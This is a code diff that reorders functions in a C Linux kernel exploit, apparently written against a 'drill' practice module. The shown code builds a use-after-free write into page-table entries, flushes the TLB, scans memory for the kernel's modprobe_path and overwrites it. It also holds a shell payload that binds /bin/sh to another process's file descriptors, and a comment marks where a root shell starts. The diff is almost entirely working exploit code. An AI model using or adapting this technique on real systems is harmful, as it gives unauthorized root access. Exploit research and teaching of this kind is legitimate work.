@@ -171,6 +171,74 @@ static long get_modprobe_path(char *buf, size_t buflen)
 	return 0;
 }
 
+long UAF_write(long phys_addr, long uaf_n, long act_fd)
+{
+	int ret;
+	char data_for_drill[16];
+	long flags = PT_FLAGS;
+
+	snprintf(data_for_drill, sizeof(data_for_drill),
+			 "0x%08lx" " %d", phys_addr + flags, 0);
+
+	return act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, data_for_drill);
+}
+
+/* The exploit can work without it, but will be less reliable */
+static void flush_tlb(void *addr, size_t len)
+{
+	short *status;
+
+	status = mmap(NULL, sizeof(short), PROT_WRITE,
+			      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+	*status = FLUSH_STAT_INPROGRESS;
+	if (fork() == 0)
+	{
+		munmap(addr, len);
+		*status = FLUSH_STAT_DONE;
+
+		sleep(9999);
+	}
+
+	SLEEPLOCK(*status == FLUSH_STAT_INPROGRESS);
+
+	munmap(status, sizeof(short));
+}
+
+static int strcmp_modprobe_path(char *new_str)
+{
+	int ret;
+	char buf[KMOD_PATH_LEN] = { '\x00' };
+
+	ret = get_modprobe_path(buf, KMOD_PATH_LEN);
+	if (ret != 0) {
+		return EXIT_FAILURE;
+	}
+
+	return strncmp(new_str, buf, KMOD_PATH_LEN);
+}
+
+/* check whether address contains modprobe */
+void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len,
+						   char *modprobe_path_str, size_t modprobe_path_len)
+{
+	void *modprobe_addr;
+	modprobe_addr = memmem(haystack_virt, haystack_len,
+						   modprobe_path_str, modprobe_path_len);
+
+	if (modprobe_addr == NULL)
+		return NULL;
+	printf("[+] found modprobe candidate, rewriting to check if it is false positive\n");
+
+	/* check for modprobe overwriting by reading /proc/sys/kernel/modprobe */
+	strcpy(modprobe_addr, "/sanitycheck");
+	if (strcmp_modprobe_path("/sanitycheck") != 0) {
+		printf("[-] ^modprobe_path not overwritten!\n");
+		return NULL;
+	}
+
+	return modprobe_addr;
+}
 
 #define PAYLOAD "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"
 
@@ -222,75 +290,6 @@ int modprobe_trigger_sock(void)
 	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* root shell will start here */
 
 	return 0;
-}
-
-/* The exploit can work without it, but will be less reliable */
-static void flush_tlb(void *addr, size_t len)
-{
-	short *status;
-
-	status = mmap(NULL, sizeof(short), PROT_WRITE,
-			      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-
-	*status = FLUSH_STAT_INPROGRESS;
-	if (fork() == 0)
-	{
-		munmap(addr, len);
-		*status = FLUSH_STAT_DONE;
-
-		sleep(9999);
-	}
-
-	SLEEPLOCK(*status == FLUSH_STAT_INPROGRESS);
-
-	munmap(status, sizeof(short));
-}
-
-long UAF_write(long phys_addr, long uaf_n, long act_fd)
-{
-	int ret;
-	char data_for_drill[16];
-	long flags = PT_FLAGS;
-
-	snprintf(data_for_drill, sizeof(data_for_drill),
-			 "0x%08lx" " %d", phys_addr + flags, 0);
-
-	return act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, data_for_drill);
-}
-
-static int strcmp_modprobe_path(char *new_str)
-{
-	int ret;
-	char buf[KMOD_PATH_LEN] = { '\x00' };
-
-	ret = get_modprobe_path(buf, KMOD_PATH_LEN);
-	if (ret != 0) {
-		return EXIT_FAILURE;
-	}
-
-	return strncmp(new_str, buf, KMOD_PATH_LEN);
-}
-
-/* check whether address contains modprobe */
-void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len,
-						   char *modprobe_path_str, size_t modprobe_path_len)
-{
-	void *modprobe_addr;
-	modprobe_addr = memmem(haystack_virt, haystack_len,
-						   modprobe_path_str, modprobe_path_len);
-
-	if (modprobe_addr == NULL)
-		return NULL;
-	printf("[+] found modprobe candidate, rewriting to check if it is false positive\n");
-
-	/* check for modprobe overwriting by reading /proc/sys/kernel/modprobe */
-	strcpy(modprobe_addr, "/sanitycheck");
-	if (strcmp_modprobe_path("/sanitycheck") != 0) {
-		printf("[-] ^modprobe_path not overwritten!\n");
-		return NULL;
-	}
-
-	return modprobe_addr;
 }
 
 int main(void)
